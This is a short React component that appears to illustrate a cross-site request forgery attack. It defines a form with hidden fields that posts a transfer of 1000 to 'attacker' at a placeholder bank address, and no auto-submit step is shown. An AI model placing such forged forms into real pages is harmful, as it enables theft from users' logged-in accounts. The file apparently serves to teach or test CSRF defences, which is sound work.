export default function TransferPage() {
    return (
        <form action="https://my-bank.example.org/transfer" method="POST">
            <input type="hidden" name="recipient" value="attacker" />
            <input type="hidden" name="amount" value="1000" />
        </form>
    )
}